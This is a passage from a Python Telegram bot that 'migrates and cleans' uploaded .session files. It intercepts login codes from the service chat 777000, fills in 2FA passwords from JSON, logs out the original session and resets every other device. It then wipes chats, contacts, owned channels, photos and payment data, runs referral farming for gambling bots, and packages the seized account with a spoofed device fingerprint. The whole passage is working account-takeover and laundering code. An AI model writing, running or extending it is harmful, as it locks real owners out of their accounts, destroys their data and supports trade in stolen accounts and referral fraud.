            logger.info(f"Старая сессия успешно завершена на попытке {attempt}.")

            try:
                await old_client.disconnect()
            except Exception:
                pass
            return True, None

        except Exception as e:
            last_error = str(e)
            logger.warning(f"Ошибка при выходе из старой сессии (попытка {attempt}/3): {e}")
            try:
                await old_client.disconnect()
            except Exception:
                pass
            await asyncio.sleep(1.0)

    return False, last_error


async def cleanup_migration(
    mig: ActiveMigration,
    state: Optional[FSMContext] = None,
    *,
    remove_queue_item: bool = True,
):
    chat_id = mig.chat_id
    if chat_id in current_migration and current_migration[chat_id].id == mig.id:
        del current_migration[chat_id]

    if mig.queue_db_id and remove_queue_item:
        remove_upload_artifact(db.remove_item(mig.queue_db_id))

    for client in (mig.old_client, mig.new_client):
        if client:
            try:
                if client.is_connected():
                    await client.disconnect()
            except Exception:
                pass

    if mig.temp_dir and mig.temp_dir.exists():
        shutil.rmtree(mig.temp_dir, ignore_errors=True)

    if state and (mig.waiting_2fa or mig.waiting_manual_code):
        await state.clear()


async def clear_user_queue(chat_id: int, state: Optional[FSMContext] = None):
    queue_task = queue_tasks.get(chat_id)
    if queue_task is not None and queue_task is not asyncio.current_task():
        queue_task.cancel()
        await asyncio.gather(queue_task, return_exceptions=True)
        queue_tasks.pop(chat_id, None)

    if chat_id in current_migration:
        await cleanup_migration(current_migration[chat_id], state)

    files_to_delete = db.clear_chat_queue(chat_id)
    for file_path in files_to_delete:
        remove_upload_artifact(file_path)

    queue_workers[chat_id] = False
    if state:
        await state.clear()


# ====================== ЭКСТРЕМАЛЬНАЯ ОЧИСТКА ======================

async def deep_clean_account(client: TelegramClient, reporter: StatusReporter) -> CleanReport:
    report = CleanReport()

    # 1. Профиль и @username
    await reporter.update(f"🧹 Сброс профиля...\n{render_progress_bar(1, 10)}", force=True)
    try:
        await client(UpdateProfileRequest(first_name=".", last_name="", about=""))
        report.profile_cleared = True
    except Exception as e:
        logger.warning(f"Ошибка сброса профиля: {e}")

    try:
        me = await client.get_me()
        if getattr(me, "username", None):
            await client(UpdateUsernameRequest(username=""))
            report.username_cleared = True
    except Exception as e:
        logger.warning(f"Ошибка удаления username: {e}")

    # 2. Аватарки
    await reporter.update(f"🧹 Удаление фото профиля...\n{render_progress_bar(2, 10)}")
    try:
        photos = await client(GetUserPhotosRequest(user_id="me", offset=0, max_id=0, limit=200))
        if photos.photos:
            input_photos = [
                InputPhoto(id=p.id, access_hash=p.access_hash, file_reference=p.file_reference)
                for p in photos.photos
            ]
            await client(DeletePhotosRequest(id=input_photos))
            report.photos_deleted = len(input_photos)
    except Exception as e:
        logger.warning(f"Ошибка удаления фото: {e}")

    # 3. Privacy Lockdown
    await reporter.update(f"🔒 Сброс приватности...\n{render_progress_bar(3, 10)}")
    try:
        disallow = [InputPrivacyValueDisallowAll()]
        await client(SetPrivacyRequest(key=InputPrivacyKeyPhoneNumber(), rules=disallow))
        await client(SetPrivacyRequest(key=InputPrivacyKeyStatusTimestamp(), rules=disallow))
        await client(SetPrivacyRequest(key=InputPrivacyKeyProfilePhoto(), rules=disallow))
        await client(SetPrivacyRequest(key=InputPrivacyKeyForwards(), rules=disallow))
        await client(SetPrivacyRequest(key=InputPrivacyKeyPhoneCall(), rules=disallow))
        await client(SetPrivacyRequest(key=InputPrivacyKeyChatInvite(), rules=disallow))
        report.privacy_secured = True
    except Exception as e:
        logger.warning(f"Ошибка параметров приватности: {e}")

    # 4. Платежные реквизиты
    try:
        await client(ClearSavedInfoRequest(credentials=True, info=True))
        report.payments_cleared = True
    except Exception as e:
        logger.debug(f"Платежные данные отсутствуют: {e}")

    # 5. Установка TTL аккаунта (30 дней)
    try:
        await client(SetAccountTTLRequest(ttl=AccountDaysTTL(days=30)))
        report.ttl_set_30d = True
    except Exception as e:
        logger.debug(f"TTL не обновлен: {e}")

    # 6. Контакты и облачный поисковый граф
    await reporter.update(f"🧹 Стирание контактов...\n{render_progress_bar(4, 10)}")
    try:
        contacts_res = await client(GetContactsRequest(hash=0))
        users = getattr(contacts_res, "users", [])
        if users:
            await client(DeleteContactsRequest(id=users))
            report.contacts_deleted = len(users)
        await client(ResetSavedRequest())
        report.saved_contacts_reset = True
    except Exception as e:
        logger.warning(f"Ошибка удаления контактов: {e}")

    # 7. Папки чатов
    await reporter.update(f"🧹 Удаление папок...\n{render_progress_bar(5, 10)}")
    try:
        filters = await client(GetDialogFiltersRequest())
        for f in getattr(filters, "filters", []):
            fid = getattr(f, "id", None)
            if fid is not None and fid != 0:
                await client(UpdateDialogFilterRequest(id=fid, filter=None))
                report.folders_deleted += 1
    except Exception as e:
        logger.warning(f"Ошибка папок: {e}")

    # 8. Стикеры и эмодзи-паки
    try:
        stickers = await client(GetAllStickersRequest(hash=0))
        for sset in getattr(stickers, "sets", []):
            try:
                await client(
                    UninstallStickerSetRequest(
                        stickerset=InputStickerSetID(id=sset.id, access_hash=sset.access_hash)
                    )
                )
                report.stickers_removed += 1
            except Exception:
                pass
    except Exception as e:
        logger.warning(f"Ошибка стикеров: {e}")

    # 9. Черновики и Избранное
    try:
        await client(ClearAllDraftsRequest())
        report.drafts_cleared = True
    except Exception:
        pass

    try:
        await client(DeleteHistoryRequest(peer="me", max_id=0, just_clear=False, revoke=True))
        report.saved_messages_cleared = True
    except Exception as e:
        logger.warning(f"Очистка Избранного: {e}")

    # 10. Диалоги, каналы, группы и боты
    await reporter.update(f"🧹 Тотальная зачистка чатов...\n{render_progress_bar(7, 10)}", force=True)
    async for dialog in client.iter_dialogs():
        entity = dialog.entity
        try:
            if isinstance(entity, Channel):
                if getattr(entity, "creator", False):
                    try:
                        await client(DeleteChannelRequest(channel=entity))
                        report.channels_deleted += 1
                    except Exception:
                        await client(LeaveChannelRequest(entity))
                else:
                    await client(LeaveChannelRequest(entity))
                report.dialogs_purged += 1

            elif isinstance(entity, Chat):
                await client(DeleteChatUserRequest(chat_id=entity.id, user_id="me"))
                report.dialogs_purged += 1

            elif isinstance(entity, User):
                if getattr(entity, "is_self", False):
                    continue
                if getattr(entity, "bot", False):
                    try:
                        await client(BlockRequest(id=entity))
                    except Exception:
                        pass
                try:
                    await client(DeleteHistoryRequest(peer=entity, max_id=0, just_clear=False, revoke=True))
                except Exception:
                    await client.delete_dialog(entity)
                report.dialogs_purged += 1

            if report.dialogs_purged % 10 == 0:
                await reporter.update(
                    f"🧹 Очищено диалогов: <b>{report.dialogs_purged}</b>\n"
                    f"{render_progress_bar(8, 10)}"
                )
                await asyncio.sleep(0.8)
            else:
                await asyncio.sleep(0.15)

        except FloodWaitError as e:
            await reporter.update(f"⏳ FloodWait: ожидание {e.seconds} с...", force=True)
            await asyncio.sleep(e.seconds + 1)
        except Exception:
            continue

    try:
        await client(ResetWebAuthorizationsRequest())
        report.web_auths_reset = True
    except Exception:
        pass

    await reporter.update(f"✅ Финал очистки!\n{render_progress_bar(10, 10)}", force=True)
    return report


# ====================== БЫСТРЫЙ ЧЕКЕР + ОЧИСТКА ======================

async def quick_check_session_fast(client: TelegramClient, timeout: float = 6.0) -> SessionCheckResult:
    try:
        async def _connect_and_auth():
            if not client.is_connected():
                await client.connect()

            if not await client.is_user_authorized():
                return SessionCheckResult(is_valid=False, status="UNAUTHORIZED", error="Сессия не авторизована")

            me = await client.get_me()
            if not me:
                return SessionCheckResult(is_valid=False, status="DEACTIVATED", error="Аккаунт деактивирован")

            phone = f"+{me.phone}" if me.phone and not str(me.phone).startswith("+") else str(me.phone or "")
            return SessionCheckResult(
                is_valid=True,
                status="ACTIVE",
                user_id=me.id,
                phone=phone,
                username=me.username,
            )

        return await asyncio.wait_for(_connect_and_auth(), timeout=timeout)

    except asyncio.TimeoutError:
        return SessionCheckResult(is_valid=False, status="TIMEOUT", error=f"Таймаут подключения (&gt;{timeout}s)")
    except PhoneNumberBannedError:
        return SessionCheckResult(is_valid=False, status="BANNED", error="Номер заблокирован в Telegram")
    except UserDeactivatedError:
        return SessionCheckResult(is_valid=False, status="DEACTIVATED", error="Аккаунт удален")
    except AuthKeyUnregisteredError:
        return SessionCheckResult(is_valid=False, status="KEY_REVOKED", error="Ключ авторизации отозван")
    except Exception as e:
        return SessionCheckResult(is_valid=False, status="ERROR", error=str(e))


async def process_fast_clean_session(item: dict, bot: Bot, state: Optional[FSMContext] = None):
    chat_id = item["chat_id"]
    mig_id = str(uuid.uuid4())[:8]
    orig_name = item["original_name"]

    status = await bot.send_message(
        chat_id,
        f"⚡ <b>[Fast Clean]</b> Проверка: <code>{html.escape(orig_name)}</code>...",
        reply_markup=action_kb(can_skip=False),
    )
    reporter = StatusReporter(status, interval=1.2)

    temp_dir = Path(tempfile.mkdtemp(prefix=f"fast_{chat_id}_{mig_id}_"))
    secure_path(temp_dir, 0o700)
    session_copy = temp_dir / "target.session"
    shutil.copy(item["file_path"], session_copy)
    secure_path(session_copy)

    proxy_dict = await resolve_live_proxy(item.get("proxy_json"))

    fp = get_random_fingerprint()
    client = get_configured_client(str(session_copy.with_suffix("")), fp, proxy_dict)
    remove_queue_item = True

    try:
        await reporter.update("🔍 <b>[1/4] Экспресс-валидация сессии...</b>", force=True)
        check = await quick_check_session_fast(client)

        if not check.is_valid:
            save_to_quarantine(chat_id, session_copy, orig_name, f"{check.status}: {check.error}")
            stats["failed"] += 1
            await reporter.update(
                f"❌ <b>Сессия в карантине (/failed):</b> <code>{html.escape(orig_name)}</code>\n"
                f"Причина: <code>{html.escape(check.error or '')}</code> ({check.status})",
                force=True,
            )
            return

        phone_label = check.phone or "NoNumber"
        await reporter.update(
            f"✅ <b>Сессия валидна!</b> <code>{html.escape(phone_label)}</code>\n"
            f"🧹 <b>[2/4] Запуск экстремальной зачистки...</b>",
            force=True,
        )

        clean_report = await deep_clean_account(client, reporter)

        if settings.enable_ugs_referral:
            await reporter.update("🍉 <b>[3/4] Прохождение рефералки @GameUGSbot...</b>", force=True)
            clean_report.ugs_referral_done = await auto_ugs_referral(client, settings.ugs_ref_param)

        if is_rc_referral_enabled():
            await reporter.update("🎟️ <b>[3/4] Прохождение RCBet...</b>", force=True)
            clean_report.rc_referral_link = await auto_rcbet_referral(
                client, settings.rc_start_param
            )
            clean_report.rc_referral_done = bool(clean_report.rc_referral_link)

        try:
            await client(ResetAuthorizationsRequest())
            clean_report.sessions_reset = True
        except Exception as e:
            clean_report.sessions_reset = False
            clean_report.sessions_reset_warning = html.escape(str(e))

        await reporter.update("📦 <b>[4/4] Сборка артефактов...</b>", force=True)
        metadata = await create_metadata(client, phone_label, fp)
        await client.disconnect()

        final_session = temp_dir / f"{phone_label}.session"
        session_copy.rename(final_session)

        meta_file = temp_dir / f"{phone_label}.json"
        meta_file.write_text(json.dumps(metadata, ensure_ascii=False, indent=2), encoding="utf-8")
        secure_path(meta_file)

        zip_path = temp_dir / f"{phone_label}_cleaned.zip"
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.write(final_session, arcname=f"{phone_label}.session")
            zf.write(meta_file, arcname=f"{phone_label}.json")
        secure_path(zip_path)

        ugs_label = "✅ Пройдена (Подписки + Капча)" if clean_report.ugs_referral_done else "⚠️ Пропущена"
        rc_label = "✅ Пройдена" if clean_report.rc_referral_done else "⚠️ Пропущена"
        rc_link_line = (
            f"\n🔗 Чек: <code>{html.escape(clean_report.rc_referral_link)}</code>"
            if clean_report.rc_referral_link
            else ""
        )
        caption = (
            f"⚡ <b>Сессия очищена по стандарту v100x+</b>\n\n"
            f"📞 Телефон: <code>{html.escape(phone_label)}</code>\n"
            f"🆔 ID: <code>{check.user_id}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🗑 Стерто диалогов: <b>{clean_report.dialogs_purged}</b>\n"
            f"📇 Контакты и поисковый топ: <b>Очищены</b>\n"
            f"👑 Удалено каналов создателя: <b>{clean_report.channels_deleted}</b>\n"
            f"💳 Платежные данные: <b>Уничтожены</b>\n"
            f"⏳ TTL аккаунта: <b>30 дней</b>\n"
            f"🔒 Privacy Lockdown: <b>Включен</b>\n"
            f"🍉 Рефералка @GameUGSbot: <b>{ugs_label}</b>\n"
            f"🎟️ RCBet: <b>{rc_label}</b>{rc_link_line}\n"
            f"🌐 Сессии: <b>{'Сброшены' if clean_report.sessions_reset else 'Пропущены (&lt; 24ч)'}</b>\n"
            "🔐 После скачивания удалите это сообщение."
        )

        await bot.send_document(
            chat_id=chat_id,
            document=BufferedInputFile(zip_path.read_bytes(), filename=f"{phone_label}_cleaned.zip"),
            caption=caption,
        )
        stats["success"] += 1

    except asyncio.CancelledError:
        remove_queue_item = False
        raise
    except Exception as e:
        logger.exception("Ошибка в fast pipeline")
        stats["failed"] += 1
        save_to_quarantine(chat_id, session_copy, orig_name, f"FAST_CLEAN_ERROR: {e}")
        await reporter.update(
            f"❌ Ошибка быстрой очистки (сохранено в /failed): <code>{html.escape(str(e))}</code>",
            force=True,
        )
    finally:
        try:
            if client.is_connected():
                await client.disconnect()
        except Exception:
            pass
        if temp_dir.exists():
            shutil.rmtree(temp_dir, ignore_errors=True)
        if item.get("id") and remove_queue_item:
            remove_upload_artifact(db.remove_item(item["id"]))


# ====================== ФИНАЛИЗАЦИЯ И МЕТАДАННЫЕ ======================

async def create_metadata(client: TelegramClient, phone: str, fp: dict[str, str]) -> dict[str, Any]:
    me: User = await client.get_me()
    ts = int(time.time())
    return {
        "app_id": settings.api_id,
        "app_hash": settings.api_hash,
        "device": fp["device"],
        "sdk": fp["sys"],
        "app_version": fp["app"],
        "system_lang_pack": fp["lang"],
        "system_lang_code": fp["lang"],
        "lang_pack": "tdesktop",
        "lang_code": fp["lang"],
        "twoFA": None,
        "id": me.id,
        "phone": phone,
        "username": me.username or "",
        "is_premium": bool(getattr(me, "premium", False)),
        "has_profile_pic": False,
        "register_time": ts,
        "last_check_time": ts,
        "first_name": me.first_name or "",
        "last_name": me.last_name or "",
        "session_file": f"{phone}.session",
    }


async def finalize(mig: ActiveMigration, message: Message, state: Optional[FSMContext] = None):
    client = mig.new_client
    phone = mig.phone
    temp_dir = mig.temp_dir
    reporter = StatusReporter(mig.status_message or message)

    try:
        if not client or not await client.is_user_authorized():
            raise AuthKeyUnregisteredError("Клиент не авторизован")

        if mig.old_client and not mig.old_session_terminated:
            success, err = await terminate_old_session(mig.old_client)
            mig.old_session_terminated = success
            mig.old_session_error = err
            mig.old_client = None

        clean_info = await deep_clean_account(client, reporter)

        if settings.enable_ugs_referral:
            await reporter.update("🍉 Прохождение рефералки @GameUGSbot...", force=True)
            clean_info.ugs_referral_done = await auto_ugs_referral(client, settings.ugs_ref_param)

        if is_rc_referral_enabled():
            await reporter.update("🎟️ Прохождение RCBet...", force=True)
            clean_info.rc_referral_link = await auto_rcbet_referral(
                client, settings.rc_start_param
            )
            clean_info.rc_referral_done = bool(clean_info.rc_referral_link)

        try:
            await client(ResetAuthorizationsRequest())
            clean_info.sessions_reset = True
        except FreshResetAuthorisationForbiddenError:
            clean_info.sessions_reset = False
            clean_info.sessions_reset_warning = "Сессия свежая (&lt; 24 ч, лимит Telegram)"
        except Exception as e:
            clean_info.sessions_reset = False
            clean_info.sessions_reset_warning = html.escape(str(e))

        metadata = await create_metadata(client, phone, mig.fingerprint)
        await client.disconnect()
        mig.new_client = None

        session_file = temp_dir / f"{phone}.session"
        original = Path(str(temp_dir / "new_session") + ".session")
        if original.exists():
            original.rename(session_file)

        if not session_file.exists():
            raise FileNotFoundError("Итоговый файл .session не найден")

        meta_file = temp_dir / f"{phone}.json"
        meta_file.write_text(json.dumps(metadata, ensure_ascii=False, indent=2), encoding="utf-8")
        secure_path(meta_file)

        zip_path = temp_dir / f"{phone}_v100x.zip"
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.write(session_file, arcname=f"{phone}.session")
            zf.write(meta_file, arcname=f"{phone}.json")
        secure_path(zip_path)

        data = zip_path.read_bytes()
        reset_status = "✅ Сброшены" if clean_info.sessions_reset else f"⚠️ {clean_info.sessions_reset_warning}"

        if mig.is_new_session:
            old_status = "— (Создана с нуля)"
        elif mig.old_session_terminated:
            old_status = "✅ Завершена (Log Out)"
        else:
            safe_err = html.escape(mig.old_session_error or "Сетевая ошибка")
            old_status = f"❌ Сбой деавторизации ({safe_err})"

        ugs_status = "✅ Пройдена (Подписки + Капча)" if clean_info.ugs_referral_done else "⚠️ Не выполнена"
        rc_status = "✅ Пройдена" if clean_info.rc_referral_done else "⚠️ Не выполнена"
        rc_extra = f"🎟️ RCBet: <b>{rc_status}</b>\n"
        if clean_info.rc_referral_link:
            rc_extra += (
                f"🔗 Чек: <code>{html.escape(clean_info.rc_referral_link)}</code>\n"
            )

        caption = (
            f"⚡ <b>Сессия мигрирована и очищена по v100x+</b>\n\n"
            f"📞 Телефон: <code>{html.escape(phone)}</code>\n"
            f"🆔 ID: <code>{metadata['id']}</code>\n"
            f"💻 Устройство: <code>{html.escape(mig.fingerprint['device'])} ({html.escape(mig.fingerprint['sys'])})</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔒 <b>Старая сессия: {old_status}</b>\n"
            f"👤 Профиль и @username: <b>Очищены</b>\n"
            f"🖼 Удалено аватарок: <b>{clean_info.photos_deleted}</b>\n"
            f"🔒 Privacy Lockdown: <b>Включён</b>\n"
            f"💳 Данные карт/платежей: <b>Очищены</b>\n"
            f"⏳ TTL аккаунта: <b>30 дней</b>\n"
            f"📇 Контакты и поисковый граф: <b>Удалены</b>\n"
            f"📁 Папок: <b>{clean_info.folders_deleted}</b> | Стикеров: <b>{clean_info.stickers_removed}</b>\n"
            f"👑 Каналов владельца: <b>{clean_info.channels_deleted}</b>\n"
            f"🗑 Диалогов/ботов/групп: <b>{clean_info.dialogs_purged}</b>\n"
            f"🍉 Рефералка @GameUGSbot: <b>{ugs_status}</b>\n"
            f"{rc_extra}"
            f"📱 Другие устройства: {reset_status}\n"
            "🔐 После скачивания удалите это сообщение."
        )

        await message.answer_document(
            BufferedInputFile(data, filename=f"{phone}_v100x.zip"),
            caption=caption,
        )
        stats["success"] += 1

    except Exception as e:
        logger.exception("Ошибка финализации")
        stats["failed"] += 1
        if mig.source_file_path and mig.source_file_path.exists():
            save_to_quarantine(mig.chat_id, mig.source_file_path, mig.original_name, f"FINALIZE_ERROR: {e}")
        await message.answer(f"❌ Ошибка миграции (сохранено в /failed): <code>{html.escape(str(e))}</code>")
    finally:
        await cleanup_migration(mig, state)


# ====================== ОБРАБОТЧИК МИГРАЦИИ ======================

async def process_one_session(item: dict, bot: Bot, state: FSMContext):
    chat_id = item["chat_id"]
    mig_id = str(uuid.uuid4())[:8]
    orig_name = item["original_name"]
    auto_mode = db.get_clean_mode(chat_id, settings.default_auto_code) == 1

    status = await bot.send_message(
        chat_id,
        f"⏳ Начинаю: <b>{html.escape(orig_name)}</b>\n"
        f"Режим перехвата: <b>{'Авто' if auto_mode else 'Вручную'}</b>\n"
        f"2FA из JSON: <b>{'Да' if item['auto_2fa'] else 'Нет'}</b>",
        reply_markup=action_kb(can_skip=True),
    )

    proxy_dict = await resolve_live_proxy(item.get("proxy_json"))

    mig = ActiveMigration(
        id=mig_id,
        chat_id=chat_id,
        original_name=orig_name,
        status_message=status,
        auto_2fa_password=item["auto_2fa"],
        proxy_config=proxy_dict,
        queue_db_id=item["id"],
    )
    current_migration[chat_id] = mig
    reporter = StatusReporter(status)

    try:
        mig.temp_dir = Path(tempfile.mkdtemp(prefix=f"mig_{chat_id}_{mig_id}_"))
        secure_path(mig.temp_dir, 0o700)
        old_session_path = mig.temp_dir / "old.session"
        new_session_path = str(mig.temp_dir / "new_session")
        shutil.copy(item["file_path"], old_session_path)
        secure_path(old_session_path)
        mig.source_file_path = old_session_path

        old_client = get_configured_client(str(old_session_path.with_suffix("")), mig.fingerprint, mig.proxy_config)
        await asyncio.wait_for(old_client.connect(), timeout=8.0)

        if not await old_client.is_user_authorized():
            save_to_quarantine(chat_id, old_session_path, orig_name, "UNAUTHORIZED: Сессия не авторизована")
            stats["failed"] += 1
            await reporter.update(
                f"❌ <b>{html.escape(orig_name)}</b>: не авторизована (сохранена в /failed).",
                force=True,
            )
            await cleanup_migration(mig)
            return

        me = await old_client.get_me()
        phone = me.phone if me else None
        if not phone:
            save_to_quarantine(chat_id, old_session_path, orig_name, "NO_PHONE: Не удалось получить номер")
            stats["failed"] += 1
            await reporter.update(
                f"❌ <b>{html.escape(orig_name)}</b>: нет номера (сохранена в /failed).",
                force=True,
            )
            await cleanup_migration(mig)
            return

        phone = f"+{phone}" if not str(phone).startswith("+") else str(phone)
        mig.phone = phone
        mig.old_client = old_client

        await reporter.update(
            f"📱 Сессия: <code>{html.escape(phone)}</code>\n"
            f"💻 Имитация: <code>{html.escape(mig.fingerprint['device'])}</code>\n"
            f"⏳ Запрашиваю код подтверждения...",
            force=True,
            reply_markup=action_kb(can_skip=True),
        )

        new_client = get_configured_client(new_session_path, mig.fingerprint, mig.proxy_config)
        await asyncio.wait_for(new_client.connect(), timeout=8.0)
        mig.new_client = new_client

        request_ts = int(time.time()) - 5
        result = await new_client.send_code_request(phone)
        mig.phone_code_hash = result.phone_code_hash
        mig.last_activity = time.time()

        if auto_mode:
            await reporter.update(
                f"📩 Код запрошен на <code>{html.escape(phone)}</code>. Опрашиваю 777000...",
                force=True,
                reply_markup=action_kb(can_skip=True),
            )
            code = None
            start_wait = time.time()

            while time.time() - start_wait < 90:
                if mig.skip_requested:
                    await cleanup_migration(mig, state)
                    return

                try:
                    async for msg in old_client.iter_messages(777000, limit=3):
                        msg_time = msg.date.timestamp() if msg.date else 0
                        if msg_time >= request_ts:
                            parsed = extract_telegram_code(msg.raw_text or "")
                            if parsed:
                                code = parsed
                                break
                    if code:
                        break
                except Exception as e:
                    logger.debug(f"Ошибка чтения 777000: {e}")

                await asyncio.sleep(1.5)

            if not code:
                save_to_quarantine(chat_id, old_session_path, orig_name, "CODE_TIMEOUT: Код от 777000 не пришел за 90 сек")
                stats["failed"] += 1
                await reporter.update(
                    f"❌ Код от 777000 для <code>{html.escape(phone)}</code> не получен за 90 сек (в /failed).",
                    force=True,
                )
                await cleanup_migration(mig)
                return

        else:
            mig.waiting_manual_code = True
            await state.set_state(MigrateStates.waiting_manual_code)
            await status.edit_text(
                f"📩 Код отправлен на <code>{html.escape(phone)}</code>\n\nОтправьте код подтверждения в чат:",
                reply_markup=action_kb(can_skip=True),
            )
            return

        await reporter.update(
            "🔑 Код получен.\n⏳ Вход в новую сессию...",
            force=True,
            reply_markup=action_kb(can_skip=False),
        )

        try:
            await new_client.sign_in(phone=phone, code=code, phone_code_hash=mig.phone_code_hash)

            success, err = await terminate_old_session(mig.old_client)
            mig.old_session_terminated = success
            mig.old_session_error = err
            mig.old_client = None

            await finalize(mig, status, state)

        except SessionPasswordNeededError:
            if mig.auto_2fa_password:
                await reporter.update("🔒 Пароль 2FA найден в JSON! Ввожу автоматически...", force=True)
                try:
                    await new_client.sign_in(password=mig.auto_2fa_password)

                    success, err = await terminate_old_session(mig.old_client)
                    mig.old_session_terminated = success
                    mig.old_session_error = err
                    mig.old_client = None

                    await finalize(mig, status, state)
                    return
                except PasswordHashInvalidError:
                    await reporter.update("⚠️ Пароль 2FA из JSON не подошел. Введите вручную:", force=True)

            mig.waiting_2fa = True
            mig.last_activity = time.time()
            await state.set_state(MigrateStates.waiting_password)
            await status.edit_text(
                f"🔑 Код <code>{code}</code> принят!\n"
                "🔒 Обнаружен пароль 2FA. Отправьте его следующим сообщением:",
                reply_markup=action_kb(can_skip=True),
            )
            return

        except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
            save_to_quarantine(chat_id, old_session_path, orig_name, f"INVALID_CODE: {e}")
            stats["failed"] += 1
            await reporter.update(
                f"❌ Неверный или истекший код: {html.escape(str(e))}",
                force=True,
            )
            await cleanup_migration(mig)
            return
        except Exception as e:
            save_to_quarantine(chat_id, old_session_path, orig_name, f"SIGN_IN_ERROR: {e}")
            stats["failed"] += 1
            await reporter.update(f"❌ Ошибка входа (в /failed): {html.escape(str(e))}", force=True)
            await cleanup_migration(mig)
            return

    except PhoneNumberBannedError:
        if mig.source_file_path:
            save_to_quarantine(chat_id, mig.source_file_path, orig_name, "BANNED: Номер заблокирован")
        stats["failed"] += 1
        await reporter.update(f"❌ Номер <code>{html.escape(mig.phone)}</code> заблокирован (в /failed).", force=True)
        await cleanup_migration(mig)
    except UserDeactivatedError:
        if mig.source_file_path:
            save_to_quarantine(chat_id, mig.source_file_path, orig_name, "DEACTIVATED: Аккаунт удален")
        stats["failed"] += 1
        await reporter.update(f"❌ Аккаунт <code>{html.escape(mig.phone)}</code> деактивирован (в /failed).", force=True)
        await cleanup_migration(mig)
    except Exception as e:
        logger.exception("Ошибка process_one_session")
        if mig.source_file_path:
            save_to_quarantine(chat_id, mig.source_file_path, orig_name, f"ERROR: {e}")
        stats["failed"] += 1
        await reporter.update(f"❌ Сбой обработки (в /failed): {html.escape(str(e))}", force=True)
        await cleanup_migration(mig)


# ====================== ВОРКЕР ОЧЕРЕДИ ======================

async def queue_worker(chat_id: int, bot: Bot, state: FSMContext):
    if queue_workers.get(chat_id, False):
        return
    queue_workers[chat_id] = True
    sem = get_chat_semaphore(chat_id)

    try:
        async def _worker_task():
            async with sem:
                while True:
                    item = db.pop_next_item(chat_id)
                    if not item:
                        break

                    rem = db.count_queue(chat_id)
                    if rem > 0 and rem % 5 == 0:
                        try:
                            await bot.send_message(chat_id, f"📋 В очереди осталось сессий: <b>{rem}</b>")
                        except Exception:
                            pass

                    mode = db.get_clean_mode(chat_id, settings.default_auto_code)
                    try:
                        if mode == 2:
                            await process_fast_clean_session(item, bot, state)
                        else:
                            await process_one_session(item, bot, state)
                    except asyncio.CancelledError:
                        raise
                    except Exception as exc:
                        logger.exception("Необработанная ошибка элемента очереди")
                        source = Path(item["file_path"])
                        if source.exists():
                            save_to_quarantine(
                                chat_id,
                                source,
                                item["original_name"],
                                f"QUEUE_ERROR: {exc}",
                            )
                        remove_upload_artifact(db.remove_item(item["id"]))
                        stats["failed"] += 1
                        with suppress(Exception):
                            await bot.send_message(
                                chat_id,
                                f"❌ Не удалось обработать "
                                f"<code>{html.escape(item['original_name'])}</code>. "
                                "Файл перемещён в карантин.",
                            )

                    mig = current_migration.get(chat_id)
                    if mig and (mig.waiting_2fa or mig.waiting_manual_code):
                        return

                    await asyncio.sleep(0.3)

        mode = db.get_clean_mode(chat_id, settings.default_auto_code)
        num_workers = settings.concurrent_workers_per_chat if mode == 2 else 1
        tasks = [_worker_task() for _ in range(num_workers)]
        await asyncio.gather(*tasks)

        if db.count_queue(chat_id) == 0 and not current_migration.get(chat_id):
            failed_cnt = count_quarantine(chat_id)
            extra = f"\n⚠️ Сбойных сессий в карантине: <b>{failed_cnt}</b> (скачать: /failed)" if failed_cnt > 0 else ""
            await bot.send_message(
                chat_id,
                f"✅ Обработка очереди полностью завершена!{extra}",
                reply_markup=main_menu_kb(chat_id),
            )
    finally:
        queue_workers[chat_id] = False


# ====================== ХЕНДЛЕРЫ ======================

router = Router()
access_middleware = AdminOnlyMiddleware()
router.message.outer_middleware(access_middleware)
router.callback_query.outer_middleware(access_middleware)


@router.message(Command("start", "help"))
async def cmd_start(message: Message, state: FSMContext):
    chat_id = message.chat.id
    await clear_user_queue(chat_id, state)

    await message.answer(
        "⚡ <b>Session Cleaner & Migrator</b>\n\n"
        "Отправляйте файлы <code>.session</code> или <b>ZIP-архивы</b> (с парными JSON и прокси)!\n\n"
        "<b>Режимы работы:</b>\n"
        "• 🔄 <b>Миграция:</b> Перенос сессии в новую с ловлей кода и гарантированным Log Out старой\n"
        f"• ⚡ <b>Fast Clean ({settings.concurrent_workers_per_chat} пот.):</b> "
        "проверка и очистка нескольких сессий параллельно\n\n"
        "<b>Встроенные модули:</b>\n"
        "• 🍉 <b>Авто-рефералка @GameUGSbot:</b> Вход по рефералке, подписка на каналы и решение фруктовой капчи после входа\n"
        "• 🎟️ <b>Авто-рефералка @redcubebetbot:</b> Чеки → 0.1 → 1 → ссылка на чек и отправка в чат\n"
        "• 📦 <b>Карантин (/failed):</b> Сохранение всех проблемных сессий с логами ошибок в ZIP-архив\n"
        "• 🌐 <b>Proxy Pool:</b> Авто-подхват прокси из JSON или ротация из <code>proxies.txt</code>\n"
        "• 🔒 <b>Privacy Lockdown + 30d TTL + Очистка платежей</b>",
        reply_markup=main_menu_kb(chat_id),
    )


@router.message(Command("failed"))
@router.callback_query(F.data == "export_failed")
async def cmd_export_failed(event: Message | CallbackQuery):
    chat_id = event.from_user.id if isinstance(event, CallbackQuery) else event.chat.id
    q_dir = Path(settings.quarantine_dir) / str(chat_id)

    if not q_dir.exists() or not any(q_dir.iterdir()):
        text = "✅ В карантине нет проблемных сессий."
        if isinstance(event, CallbackQuery):
            await event.answer(text, show_alert=True)
        else:
            await event.answer(text)
        return

    zip_path = q_dir / "failed_sessions.zip"
    session_count = 0
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for f in q_dir.iterdir():
            if f.is_file() and f.name != "failed_sessions.zip":
                zf.write(f, arcname=f.name)
                if f.suffix == ".session":
                    session_count += 1
    secure_path(zip_path)

    data = zip_path.read_bytes()
    msg_target = event.message if isinstance(event, CallbackQuery) else event
    await msg_target.answer_document(
        BufferedInputFile(data, filename="failed_sessions.zip"),
        caption=(
            f"📦 <b>Выгружено проблемных сессий: {session_count}</b>\n"
            f"Внутри архива находятся файлы <code>.session</code> и <code>.error.txt</code> с причиной сбоя по каждой."
        ),
    )
    shutil.rmtree(q_dir, ignore_errors=True)
    if isinstance(event, CallbackQuery):
        await event.answer("Архив выгружен, карантин очищен.")


@router.callback_query(F.data == "cycle_clean_mode")
async def cb_cycle_clean_mode(call: CallbackQuery):
